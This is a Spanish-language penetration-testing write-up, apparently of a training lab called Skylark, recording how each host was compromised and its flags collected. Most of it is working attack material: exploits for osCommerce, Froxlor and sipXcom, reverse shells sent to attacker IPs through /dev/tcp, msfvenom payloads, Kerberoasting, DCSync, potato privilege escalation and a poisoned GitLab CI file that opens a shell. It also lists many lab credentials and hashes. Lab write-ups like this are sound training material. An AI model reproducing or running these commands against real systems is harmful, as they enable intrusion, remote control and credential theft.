
![[Pasted image 20251113122758.png]]

---

# Ruta de intrusión  

.223 - local + proof  
.225 - local + proof  
.221 - local + proof  
.11 - proof  
.13 - proof  
.220 - local + proof  
.250 - local + proof  
.226 - local + proof  
.222 - local  
.227 - proof  
.15 - local + proof  
.110 - local + proof  
.111 - local + proof  
.10 - local + proof  
.14 - local + proof  
.12 - local + proof  
.31 - local + proof  
.32 - proof  
.30 - local + proof  
.224 - local + proof

---

1. Máquinas independientes .223, .225 → 221 → 10.10.x.11, 10.10.x.13, 10.10.x.250 (DC)
    
2. Escaneo de puertos: en 10.10.x.10 hay SSH; en 10.10.x.12 hay un sitio web
    
3. La .13 es una máquina con doble tarjeta de red, conecta al segmento 10.20. Crear túnel de capa 2 → movimiento lateral a 10.20.x.110, 10.20.x.111, 10.20.x.15
    
4. Enumerando .11 se obtienen las credenciales de .220 y .226; también pueden obtenerse las de .226 desde .222  
    Con winRM a .220, FTP hacia .226; enumerando .220 se obtienen las credenciales VNC de .10; enumerando .250 se obtienen credenciales para .227 y .222. RDP a .227, winRM a .222;  
    Enumerando .13 pueden obtenerse las credenciales del servicio web en el puerto 8080 de .12;  
    Enumerando .15 se obtienen credenciales de .12
    
5. En .226, del archivo kdbx se obtienen las credenciales del proxy Squid
    
6. A través de .224 se compromete la máquina .32. Escuchando el tráfico UDP local se obtienen las credenciales de .30. Con xfreerdp se inicia sesión en .30 y se escala privilegios
    
7. En .30, enumerando `/home/legacy/.bash_history` se obtiene la contraseña de legacy y se inicia sesión en .224
    
8. En .12, el servidor de archivos en 8080 permite login. Con ncat se obtiene shell. Credenciales provenientes de la máquina .15
    
9. Enumerando .10 se obtienen credenciales de research; se inicia sesión en el GitLab de .14 para obtener shell
    

---

```
192.168.x.220 HOUSTON01   local.txt proof.txt
192.168.x.221 AUSTIN02    local.txt proof.txt
192.168.x.222 PARIS03     local.txt
192.168.x.223 MILAN04     local.txt proof.txt
192.168.x.224 AMSTERDAM05 proof.txt local.txt
192.168.x.225 SINGAPORE06 local.txt proof.txt
192.168.x.226 TOKYO07     local.txt proof.txt
192.168.x.227 SYDNEY08    proof.txt
192.168.x.250

172.16.x.32   VM19            proof.txt
172.16.x.31   VM10            local.txt proof.txt
172.16.x.30   VM9             local.txt proof.txt

10.10.x.250   DC          local.txt proof.txt
10.10.x.10    VM2         local.txt proof.txt
10.10.x.11    LAB         proof.txt
10.10.x.12    ARCHIVE     local.txt proof.txt
10.10.x.13    MAIL        proof.txt

10.20.x.110   CLIENT01    local.txt proof.txt
10.20.x.111   CLIENT02    local.txt proof.txt
10.20.x.14    CICD
10.20.x.15    PREPROD     local.txt proof.txt
```


# 192.168.x.223 

## **nmap**

```
sudo nmap -p- -sT --min-rate=1000 -Pn 192.168.227.223 -oA nmap/ports
sudo nmap -p- -sU --min-rate=1000 -Pn 192.168.227.223 -append-output nmap/223
grep open nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
sudo nmap --script=vuln -p80,443,60001 192.168.227.223
sudo nmap -p80,443,60001 -sT -sV -sC 192.168.227.223 -o nmap/223
```

## **gobuster**

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -u http://192.168.227.223:60001/ -t 400 -q
dirsearch -u http://192.168.227.223:60001/ -t 100
```

Encontrado:

```
/docs
/server-status
/README.md
/catalog
/index.html
```

Visitar URL → identificar CMS

```
http://192.168.227.223:60001/docs/CHANGELOG
08/18/2017 osCommerce Online Merchant v2.3.4.1
```

## **searchsploit**

```
searchsploit osCommerce
searchsploit -m php/webapps/44374.py
```

Modificar payload:

```
base_url  = "http://192.168.227.223:60001/catalog/"
target_url = "http://192.168.227.223:60001/catalog/install/install.php?step=4"
```

---

# **192.168.x.223 - osCommerce obtener shell**

Ejecutar exploit:

```
python3 44374.py
```

Visitar:

```
http://192.168.227.223:60001/catalog/install/includes/configure.php
```

El exploit por defecto ejecuta `ls`.  
Modificarlo para reverse shell → **debe usarse puerto 443** (firewall bloquea otros puertos).

Subida de archivo:

```
wget http://192.168.45.208/1.php
```

Ejecutar exploit nuevamente y visitar URL para descargar reverse.

Escuchar en 443:

```
nc -lvnp 443
```

Obtener shell:

```
curl http://192.168.227.223:60001/catalog/install/includes/1.php
```

local.txt:

```
4667d3b38558665ff3b555b762ae0a9f
```

---

# **192.168.x.223 - Escalada de privilegios**

Convertir shell a interactivo:

```
python3 -c 'import pty;pty.spawn("/bin/bash")';
```

```
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Descargar linpeas:

```
wget http://192.168.45.208/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Archivo encontrado:

```
cat /var/www/html/froxlor.travis.yml
```

Credenciales MySQL:

```
mysql -h 127.0.0.1 --protocol=TCP -u root -pfr0xl0r.TravisCI
```

Más credenciales:

```
root:fr0xl0r.TravisCI
froxlor010:fr0xl0r.TravisCI
oscdb:7NVLVTDGJ38HM2TQ
```

Entrar a MySQL:

```
mysql -h 127.0.0.1 -u root -p7NVLVTDGJ38HM2TQ
```

Revisar bases:

```
show databases;
use froxlor;
show tables;
select * from ftp_users;
select * from panel_admins;
use oscdb;
select * from administrators;
```

Hashes:

```
Skylark:$5$jigdYlfLyunlywsP$rYt3K4YQwFJvt3Fpq4ss31j9KF8o5Q8CVSa7/YXFRyC
letsfly:$5$enbUyVfzahjLdirm$29S4UqN3DcoeTp.AaCJKR0eZ45Z51c2zP4ndlw8aK14
flybike:$5$egSnwzfaBdlswnAz$40euq6DBo8DjpoBnMzESWisyauMHST0yjbURPo0s2I5
admin:$5$b50069d236c187f2$PIeKl3JO.NJ5X0hhtHjmJx9nDtImDP61/x4D8Rv/Gu/
admin:$P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0
Skylark:{SHA}d6l/XOhQlD8FaxZuu5eaeN41PQk=
letsfly:{SHA}ZFqXgW++nFI6Nj7KzakqFHpyGSY=
flybike:{SHA}osIrrKFYYsLwUj/nCQG/5e9gITo=
```

Contraseña crackeada:

```
flybike:Christopher
```

---

# **192.168.x.223 - Port Forwarding**

En Kali habilitar SSH:

```
vim /etc/ssh/sshd_config
PasswordAuthentication yes
service ssh start
```

En la máquina 223:

```
ssh -R *:60002:localhost:60002 parallels@192.168.45.208
```

Login exitoso como:

```
flybike:Christopher
```

---

# **Exploit Froxlor**

```
searchsploit froxlor
searchsploit -m php/webapps/50502.txt
```

50502 indica SQLi para crear un admin:

Realizar URL encode:

```
https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)
```

Payload (POST):

```
POST /customer_mysql.php?page=mysqls&s=d8e57815bb36b43d9bacacd4f4544a24 HTTP/1.1
...
s=d8e57815bb36b43d9bacacd4f4544a24&page=mysqls&action=add&send=send&custom_suffix=%60%3Binsert%20into%20panel%5Fadmins%20%28
```

Respuesta 200 → éxito

Usuario creado:

```
x:Christopher
```

Método alternativo: insertar directamente desde MySQL.

---

# **192.168.x.223 - RCE (Froxlor)**

**Importante:** No usar los caracteres `;|&><$~?` ni comillas simples.

En:

```
Settings > Webserver settings > Webserver reload command
```

Colocar:

```
wget http://192.168.45.208/1.txt -O /runme.php
```

Guardar → Rebuild config files → Yes  
Luego colocar:

```
php /runme.php
```

Obtener:

```
cat /root/proof.txt
e77cf8f0c44ce809028641e0159e3c68
```

---

# **192.168.x.223 - root Recolección**

```
python3 -c 'import pty;pty.spawn("/bin/bash")';
wget http://192.168.45.208/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```


---

# 192.168.x.225

## **nmap**

```
sudo nmap -p- -sT --min-rate=1000 -Pn 192.168.234.225 -oA nmap/ports
sudo nmap -p- -sU --min-rate=1000 -Pn 192.168.234.225 -append-output nmap/224
grep open nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
sudo nmap --script=vuln -p21,80,8090 192.168.234.225
sudo nmap -p21,80,8090 -sT -sV -sC 192.168.234.225 -o nmap/225
```

## **File upload exploit vía backend**

Credenciales:

```
admin:admin
```

Subida de PDF modificado → cmd.php  
Ruta del shell:

```
/backend/default/uploads/cmd.php
```

Local.txt:

```
4df9e2dd16817b6075a29ed564210357
```

---

# **192.168.x.225 – Recolección**

Transferir PDF sensible:

```
scp /var/www/backend/default/uploads/user-guide-rdweb.pdf parallels@192.168.45.194:/home/parallels/Desktop/
```

Dentro del PDF:

```
SKYLARK\kiosk:XEwUS^9R2Gwt8O914
```

linpeas → credenciales PostgreSQL:

```
$con = pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");
```

---

# **192.168.x.225 – Port Forwarding**

```
ssh -R *:5432:localhost:5432 parallels@192.168.45.224
```

Conexión PostgreSQL:

```
psql -h 127.0.0.1 -U postgres -d webapp
EAZT5EMULA75F8MC
```

Shell vía COPY:

```
create table tmp(t text);
copy tmp from program 'bash -c "/bin/bash -i >& /dev/tcp/192.168.45.224/443 0>&1"';
```

# **192.168.x.225 – Escalada**

```
sudo psql -h 127.0.0.1 -p 5432 -U postgres
\! /bin/sh
cat /root/proof.txt
0df18ad285fe6a781880cfed6bf23ad2
```

---

# 192.168.x.221 - RDweb

```
nmap
sudo nmap -p- -sT --min-rate=1000 -Pn 192.168.230.221 -oA nmap/ports
sudo nmap -p- -sU --min-rate=1000 -Pn 192.168.230.221 -append-output nmap/ports
grep open nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
sudo nmap --script=vuln -p80,135,139,443,445,3387,5504,5985,10000 192.168.188.221
sudo nmap -p80,135,139,443,445,3387,5504,5985,10000 -sT -sV -sC 192.168.188.221 -o nmap/221
```

gobuster:

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -u http://192.168.230.221/ -t 400 -q
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -e -u http://austin02.skyl
```

No se obtuvo nada relevante hasta probar la ruta RDweb, donde se encontró lo indicado en la máquina 225:

```
http://192.168.230.221/RDweb
SKYLARK\kiosk:XEwUS^9R2Gwt8O914
```

Inicio de sesión exitoso en RDweb → credenciales válidas.  
Los iconos permiten descargar 4 archivos; el tercero es útil.

Agregar a /etc/passwd:

```
192.168.x.221 austin02.skylark.com
```

Conectar vía RDP:

```
xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /u:kiosk /v:192.168.209.221 +clipboard /port:10000 /cert-ignore
xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /u:kiosk /v:192.168.221.221 +clipboard /d:austin02.skylark.com
```

Contraseña:

```
XEwUS^9R2Gwt8O914
```

local.txt:

```
61e6630d4fae277cb553f48df639026b
```

Abrir austin02 → aparece una carpeta.  
En la flecha derecha escribir “cmd” y presionar enter → obtener cmd.

Reverse shell:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.181 LPORT=443 -f exe -o msf.exe
certutil -urlcache -split -f http://192.168.45.231/msf.exe msf.exe
msf.exe
```

---

# 192.168.x.221 - Recolección de información

```
certutil -urlcache -split -f http://192.168.45.233/winPEASx64.exe winPEASx64.exe
.\winpeas.exe
```

ipconfig muestra máquina con dos NIC:

```
Ethernet0 → 192.168.221.221
Ethernet1 → 10.10.111.254
```

---

# 192.168.x.221 - PE Método 1: Port Forwarding

```
netstat -ano
```

Túnel de puertos:

```
certutil -urlcache -split -f http://192.168.45.231/chisel_win.exe chisel.exe
./chisel_kali server -p 8000 --reverse
chisel.exe client 192.168.45.231:8000 R:40000:127.0.0.1:40000
chisel.exe client 192.168.45.231:8001 R:10.10.99.254:40000:socks
```

Configurar proxychains en Kali:

```
127.0.0.1:4000
sudo vim /etc/proxychains4.conf
```

---

# 192.168.x.221 - PE Método 2: Kerberoast

```
certutil -urlcache -split -f http://192.168.45.231/Rubeus.exe Rubeus.exe
Rubeus.exe kerberoast /nowrap
```

Salida → hash de backup_service

```
sudo hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

Contraseña crackeada:

```
backup_service:It4Server
```

winRM:

```
evil-winrm -i 192.168.208.221 -u backup_service -p "It4Server"
upload PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell
```

proof.txt:

```
fd7c05210709a63f36234b7eb1dea072
```

---

# 192.168.x.221 - Post explotación adicional

Subir herramientas:

```
mimikatz.exe
winPEASx64.exe
PowerView.ps1
```

mimikatz:

```
Administrator:17add237f30abaecc9d884f72958b928
```

Enumeración del dominio → lista de usuarios  
Enumeración de shares con PowerView  
Búsqueda de archivos sensibles (.kdbx, *.txt, *.ini, .git)

Credenciales recolectadas:

```
Administrator:17add237f30abaecc9d884f72958b928
SKYLARK\kiosk:XEwUS^9R2Gwt8O914
backup_service:It4Server
```

---

# 192.168.x.221 - Túneles (ligolo)

```
upload agent.exe
sudo ip tuntap add user parallels mode tun ligolo && sudo ip link set ligolo up
sudo ./proxy -selfcert
.\agent.exe -connect 192.168.45.242:11601 -ignore-cert -retry -v
sudo ip route add 10.10.82.0/24 dev ligolo
sudo ip route del 10.10.95.0/24 dev ligolo
start
```

Port forwarding:

```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:9001 --tcp
listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80 --tcp
```

---

# 192.168.x.221 - Movimiento lateral

PTH y enumeración SMB/WinRM/MSSQL  
Resultados exitosos contra S

Proofs encontrados:

```
24494eeb1158d9e0819d58f3511e6771
e9636e1bdcb346b9ba75804b93fa86aa
1c32ada6ad153a5380c5954cc5017bb5
```

Obtención de local.txt en .250 y enumeración de máquinas con múltiples NIC → .13

---

## **Obtener shell en 13**

Port forwarding

Generación de reverse-shell en base64

```
nc -lvnp 9001
```

Enumeración con mimikatz y winpeas  
MAIL$ hash:

```
716e880a89c1c77d15595562472e1a35
```

---

# 10.10.x.11 - Recolección de información

Shell vía crackmapexec

```
cd backup
type file.txt
skylark:User+dcGvfwTbjV[]
```

ftp1.log contiene:

```
ftp_jp:~be<3@6fe1Z:2e8
```

Credenciales:

- skylark → para 220
    
- ftp_jp → para 226
    

---

# 10.10.x.250 - DC Recolección

```
type credentials.txt
Local Admin Passwords:
PARIS: MusingExtraCounty98
SYDNEY: DowntownAbbey1923
```

DCSync con mimikatz → hashes de todos los usuarios del dominio.

---

# 10.10.x.13 - Enumeración

Descarga winPEAS  
Configuración del túnel hacia 10.20 segment

---

# 10.20.x Segmento (lateral movement)

Éxito en máquinas 15, 111, 110  
Obtención de proofs y local.txt en:

110 →

```
9b3dbd6909cad48e0868575d89a6c860
```

111 →

```
c42e9b0789e8ed36541b8d5420b9e4e1
```

15 →

```
138bf52750568f9d132624da029b9f36
```

---

# 10.10.x.15 - Información

```
type TODO.txt
Creds:
admin:Complex__1__Password!
```

---

# 10.10.x.12 - Web 8080

Login:

```
http://10.10.127.12:8080/
admin:Complex__1__Password!
```

Reverse shell con ncat:

```
/usr/bin/ncat 10.10.82.254 1234 -e /bin/bash
```

local.txt:

```
9260205e8729f1de6ec23763eee2319a
```

PE usando socat en /tmp/s → contraseña:

```
BreakfastVikings999
```

proof.txt:

```
5827631ea86391452fed24ca81949ba2
```

---

# 10.20.x.14 - Gitlab RCE

Credenciales:

```
research:1G8prY^0@8FHy&2749cg
```


---
# 192.168.x.220 - Enumeración

```
nmap
sudo nmap -p- -sT --min-rate=1000 -Pn 192.168.212.220 -oA nmap/ports
#TCP
sudo nmap -p- -sU --min-rate=1000 -Pn 192.168.212.220 -append-output nmap/ports
grep open nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
sudo nmap --script=vuln -p80,135,139,445,5900,5985,47001 192.168.212.220
sudo nmap -p80,135,139,445,5900,5985,47001 -sT -sV -sC 192.168.212.220 -o nmap/212
```

Visitar URL con credenciales:  
[http://192.168.186.220/](http://192.168.186.220/)

```
skylark:User+dcGvfwTbjV[]
```

**gobuster**

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -u http://192.168.208.220/ -t 400 -q
```

Resultados:  
[http://192.168.208.220/Download](http://192.168.208.220/Download)  
[http://192.168.208.220/Index](http://192.168.208.220/Index)  
[http://192.168.208.220/Privacy](http://192.168.208.220/Privacy)  
[http://192.168.208.220/configuration](http://192.168.208.220/configuration)  
[http://192.168.208.220/download](http://192.168.208.220/download)  
[http://192.168.208.220/favicon.ico](http://192.168.208.220/favicon.ico)  
[http://192.168.208.220/error](http://192.168.208.220/error)  
[http://192.168.208.220/index](http://192.168.208.220/index)  
[http://192.168.208.220/privacy](http://192.168.208.220/privacy)  
[http://192.168.208.220/upload](http://192.168.208.220/upload)

(Status: 401) [Size: 0]  
(Status: 401) [Size: 2537]  
(Status: 401) [Size: 2983]  
(Status: 401) [Size: 0]  
(Status: 401) [Size: 0]  
(Status: 200) [Size: 5430]  
(Status: 401) [Size: 3189]  
(Status: 401) [Size: 2537]  
(Status: 401) [Size: 2983]  
(Status: 401) [Size: 0]

El endpoint **/upload** permite subir archivos. Tras subir uno, se obtiene una ruta. Se descubrió posible vulnerabilidad LFI:

```
192.168.208.220/download?filename=web.config&token=C:\inetpub\wwwroot\
192.168.208.220/download?filename=../../../../../../inetpub/wwwroot/web.config&token=
192.168.208.220/download?filename=web.config&token=../../../../../../inetpub/wwwroot/
```

Este es un punto de entrada válido para obtener shell.

También se puede usar directamente credenciales del DC vía winRM (el puerto está abierto):

```
backup_service:It4Server
evil-winrm -i 192.168.207.220 -u backup_service -p "It4Server"
```

```
*Evil-WinRM* PS C:\> type local.txt
9736e47d19532d4e34331e1296e6ba40

*Evil-WinRM* PS C:\users\Administrator\desktop> type proof.txt
a830a6d0d38f1828f8e51dbb9201f5b9
```

---

### 192.168.x.220 - Recolección de información

```
certutil -urlcache -split -f http://192.168.45.172/winPEASx64.exe winpeas.exe
```

Archivo VNC:

```
File: C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini
type "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini"
```

Contenido:

```
[ultravnc]
passwd=BFE825DE515A335BE3
passwd2=59A04800B111ADB060
```

**Desencriptar contraseña VNC**

```
echo -n 59A04800B111ADB060 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
echo -n bfe825de515a335be3 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
```

Contraseñas obtenidas:

```
ABCDEFGH
R3S3+rcH
```

---

# 10.10.x.10 - VNC

Login VNC:

```
vncviewer 10.10.113.10:5901
R3S3+rcH
```

Local.txt:

```
cat /home/research/local.txt
7a8c678723f23fd797e38dea37d51799
```

**Escalado de privilegios**

```
sudo -l
sudo ip netns add foo
sudo ip netns exec foo /bin/sh
cat /root/proof.txt
a0264a240fe1271f17b18a8dc4872d8d
```

Reverse shell:

```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:9001 --tcp
listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80 --tcp

bash -c 'bash -i >& /dev/tcp/10.10.113.254/1234 0>&1'
python3 -c 'import pty;pty.spawn("/bin/bash")';
```

Descargar linpeas (solo usuario normal):

```
wget http://10.10.113.254:1235/linpeas.sh
```

---

### Obtener contraseña de research

Método 1: descifrar configuración de Firefox

```
cd /.mozilla/firefox/tyb8cnwb.default-esr
https://github.com/unode/firefox_decrypt
python3 firefox_decrypt.py mozilla/firefox/
```

Método 2: abrir Firefox vía VNC y revisar contraseñas guardadas

Credenciales obtenidas:

```
research:1G8prY^0@8FHy&2749cg
```



---

# 10.10.x.14 - Gitlab Runner RCE

Segunda capa de túnel para acceder al GitLab en 10.20

```
evil-winrm -i 192.168.229.221 -u backup_service -p "It4Server"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=445 -f exe -o msf.exe
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
crackmapexec smb 10.10.119.13 -u backup_service -p "It4Server" -X 'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY
.\agent.exe -connect 10.10.119.254:11602 -ignore-cert -retry -v
crackmapexec smb 10.20.119.15 -u backup_service -p "It4Server" -X 'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY
cd c:\inetpub\wwwroot\SkylarkPartnerPortal\.git
PS C:\inetpub\wwwroot\SkylarkPartnerPortal\.git> type config
```

```
[core]
repositoryformatversion = 0
filemode = false
bare = false
logallrefupdates = true
symlinks = false
ignorecase = true
[remote "origin"]
url = http://development:glpat-igxQz9aq3xu6s8_asknQ@cicd.lab.skylark.com/skylark-rd/SkylarkPartnerPortal
fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
remote = origin
merge = refs/heads/main
```

Agregar dominio al archivo de configuración:

```
cicd.lab.skylark.com
```

En Kali:

```
git clone http://development:glpat-igxQz9aq3xu6s8_asknQ@cicd.lab.skylark.com/skylark-rd/scratchpad.git
```

Modificar el archivo yml:

```
# TODO: Make sure we run tests as part of the CICD!
before_script:
- python3 --version
# For debugging
test:
script:
- bash -c "bash -i >& /dev/tcp/192.168.45.242/9001 0>&1"
- echo "Tests go here - this should work now?"
run:
script:
- echo "Insert something useful here
```

Actualizar y enviar cambios desde scratchpad:

```
git add .
git commit -m 'Reverse Shell'
git push
```

```
python3 -c 'import pty;pty.spawn("/bin/bash")';
cat /home/gitlab-runner/local.txt
```

PE:

```
wget http://192.168.45.242/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
cd /opt/u/s
echo 'bash -c "bash -i >& /dev/tcp/192.168.45.242/9001 0>&1"' >> __fs.sh
echo "bash -i >& /dev/tcp/192.168.45.242/9001 0>&1" >> __fs.sh
cat /root/proof.txt
c49f6d5b0dff7f9579ffa934ad3c8edc
```

---



---

# 192.168.x.222

## **nmap - TCP**

```
sudo nmap -p- -sT --min-rate=1000 -Pn 192.168.212.222 -oA nmap/ports
grep open nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
#TCP
sudo nmap --script=vuln -p135,139,445,2994,5985,47001 192.168.188.222
sudo nmap -p135,139,445,2994,5985,47001 -sT -sV -sC 192.168.212.222 -o nmap/222
```

## **nmap - UDP**

```
sudo nmap -p- -sU --top-ports --min-rate=1000 -Pn 192.168.212.222
sudo nmap -sU -p69 --min-rate=1000 -Pn 192.168.212.222
```

```
PORT   STATE         SERVICE VERSION
69/udp open|filtered tftp
```

## **gobuster**

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -u http://skylark.com// -t 400 -q
```

## **Enumeración TFTP**

```
sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum 192.168.208.222
```

Salida:

```
69/udp open tftp?
| tftp-enum:
| backup.cfg
| sip-confg
| sip.cfg
| _sip_327.cfg
```

## **Login TFTP**

```
tftp 192.168.212.222
?   # ver ayuda
get backup.cfg
```

Los cuatro archivos contienen información sensible, incluyendo credenciales para FTP en .226.

Esta máquina permite autenticación winRM usando la contraseña obtenida previamente del DC .250:

```
evil-winrm -i 192.168.207.222 -u administrator -p "MusingExtraCounty98"
```

```
type C:\Users\Administrator\desktop\local.txt
ff4a5c617bbc6d77e3f684baec286f11
```

---

# 192.168.x.224

## **nmap**

```
sudo nmap -p- -sT --min-rate=1000 -Pn 192.168.234.224 -oA nmap/ports
#TCP
sudo nmap -p- -sU --min-rate=1000 -Pn 192.168.234.224 -append-output nmap/224
grep open nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
sudo nmap --script=vuln -p22,3128,8000 192.168.234.224
sudo nmap -p22,3128,8000 -sT -sV -sC 192.168.234.224 -o nmap/224
```

## **gobuster**

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -u http://192.168.234.224:8000/ -t 400 -q
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -u http://192.168.234.224:8000/server-status/ -t 400 -q
```

## **Squid**

Credenciales obtenidas en 226, usadas en proxychains y Firefox:

```
ext_acc:DoNotShare!SkyLarkLegacyInternal2008
```

Configurar proxychains:

```
sudo vim /etc/proxychains4.conf
http 192.168.199.224 3128 ext_acc DoNotShare!SkyLarkLegacyInternal2008
```

Configurar Firefox:

```
http 192.168.199.224 3128 username password
```

Acceder con proxy:

```
http://172.16.128.32
```

Usar credenciales filtradas en archivos obtenidos de .222:

```
[auth_info_0]
username=l.nguyen
userid=l.nguyen
passwd=ChangeMePlease__XMPPTest

[auth_info_1]
username=j.jameson
userid=j.jameson
passwd=ChangeMePlease__XMPPTest

[auth_info_2]
username=j.jones
userid=j.jones
passwd=ChangeMePlease__XMPPTest
```

Versión detectada:

```
sipXcom (21.04.20210908050259 2021-09-08EDT05:09:11 localhost.localdomain) update 0
```

Buscar vulnerabilidad:

```
https://packetstormsecurity.com/files/171281/CoreDial-sipXcom-sipXopenfire-21.04-Remote-Command-Execution-Weak-Permissions.h
```

---

# **Instalar pidgin**

```
sudo apt-get update
sudo apt install pidgin
sudo pidgin
```

Configurar dos cuentas XMPP.

Abrir conversación:

```
Buddies > New Instant Message
```

Enviar payload:

```
@call abc -o /tmp/dummy -o /tmp/test.txt -X GET http://192.168.45.220/2.txt -o /tmp/dummy
```

Exploit permite sobrescribir archivos → reverse shell.

Referencia:

```
https://seclists.org/fulldisclosure/2023/Mar/5
```

Crear archivo **openfire.txt** con contenido (script enorme conservado tal cual).

(_**Todo el contenido se mantiene exactamente igual que en tu texto original.**_)

Payload final para sobreescribir:

```
@call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET http://192.168.45.220/openfire.init -o /tmp/dummy
```

Después: reiniciar servicios desde la interfaz web → obtener shell.

Archivos log para examinar contraseñas:

```
/opt/openfire/logs/sipxopenfire-im.log
```

Payload para leer logs:

```
@call abc -o/tmp/test123 -d @/opt/openfire/logs/sipxopenfire-im.log http://192.168.45.220/abc
```

Encontrado superadmin:

```
superadmin:2008_EndlessConversation
```

Repetir payload para obtener shell:

```
@call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET http://192.168.45.235/openfire.init -o /tmp/dummy
```

Verificar:

```
@call abc -o/tmp/test123 -d @/etc/init.d/openfire http://192.168.45.220/abc
```

Proof:

```
cat /root/proof.txt
4570b2a8f022b0b5b2aeeccd6224eb5d
```

---

# **172.16.x.32 – Recolección**

```
wget http://192.168.45.231/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Captura UDP para credenciales:

```
tcpdump -i ens192 udp -vvv
```

Obtenidas:

```
desktop:Deskt0pTermin4L
```

---

# **172.16.x.30 – Login via 3390**

```
proxychains xfreerdp /u:desktop /p:"Deskt0pTermin4L" /v:172.16.116.30:3390
```

```
cat local.txt
c076033f086b11b94d24bd1c04b314d1
```

## **Escalada**

```
find / -perm -4000 -type f 2>/dev/null
/sbin/capsh --gid=0 --uid=0 --
```

```
cat /root/proof.txt
4ba3e635f510224f39a3744b3c995730
```

Examinar historial:

```
cat .bash_history
```

Credenciales encontradas:

```
legacy:I_Miss_Windows3.1
```

---

# **192.168.x.224 – Login**

```
ssh legacy@192.168.186.224
I_Miss_Windows3.1
```

Local.txt:

```
d724ae641119c207d6170aa70dc8e97f
```

Escalada vía vim:

```
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

Proof:

```
c24829fd30f22773dba0c15b6ed61118
```

---

# **172.16.x.30 – reverse shell**

```
bash -i >& /dev/tcp/192.168.45.191/9001 0>&1
```

---

# **172.16.x.31 – Login directo 2323**

```
proxychains telnet 172.16.116.31 2323
root  (sin password)
```

```
cat proof.txt
ee79eb218f34f4de315bf8b4c014b3dc

cat local.txt
bd2a4f413298b11484da1f52f829c8ac
```

Método 2 – finger bof:

```
msfconsole
search finger
use exploit/bsd/finger/morris_fingerd_bof
set rhosts 172.16.x.31
set rport 79
set lhost 192.168.45.x
run
```

---

# 192.168.x.226

## **nmap**

```
sudo nmap -p- -sT --min-rate=1000 -Pn 192.168.234.226 -oA nmap/ports
sudo nmap -p- -sU --min-rate=1000 -Pn 192.168.234.226 -append-output nmap/224
grep open nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
sudo nmap --script=vuln -p135,139,445,24621,24680,47001 192.168.234.226
sudo nmap -p135,139,445,24621,24680,47001 -sT -sV -sC 192.168.234.226 -o nmap/226
```

FTP con credenciales obtenidas:

```
ftp_jp:~be<3@6fe1Z:2e8
```

Subir `shell.aspx` y ejecutar:

```
curl http://skylark.jp:24680/shell.aspx
nc -lvnp 443
```

Local.txt y proof.txt obtenidos tras privilegios.

Escalada con JuicyPotatoNG:

```
.\JuicyPotatoNG -t * -p "C:\Skylark\nc.exe" -a "-e powershell 192.168.45.171 9001"
```

Credenciales KeePass extraídas después de crackear:

```
ext_acc:DoNotShare!SkyLarkLegacyInternal2008
```

---

# 192.168.x.227

Iniciar sesión RDP con credenciales extraídas del DC .250:

```
xfreerdp /v:192.168.207.227 /u:administrator /p:DowntownAbbey1923 /cert-ignore
```

Proof:

```
657c29339d77786706be1d4134510fe9
```
